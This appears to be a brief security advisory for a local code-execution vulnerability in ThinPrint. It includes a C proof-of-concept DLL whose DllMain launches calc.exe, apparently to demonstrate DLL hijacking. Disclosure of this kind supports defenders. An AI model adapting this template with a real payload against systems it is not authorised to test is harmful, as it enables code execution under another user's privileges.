ThinPrint is prone to a vulnerability that lets attackers execute arbitrary code.

Exploiting this issue allows local attackers to execute arbitrary code with the privileges of the user running the affected application.

#include <windows.h>

	int hijack_poc ()
	{
	  WinExec ( "calc.exe" , SW_NORMAL );
	  return 0 ;
	}

	BOOL WINAPI DllMain
		 (	HINSTANCE hinstDLL ,
			DWORD dwReason ,
			LPVOID lpvReserved )
	{
	  hijack_poc () ;
	  return 0 ;
	}
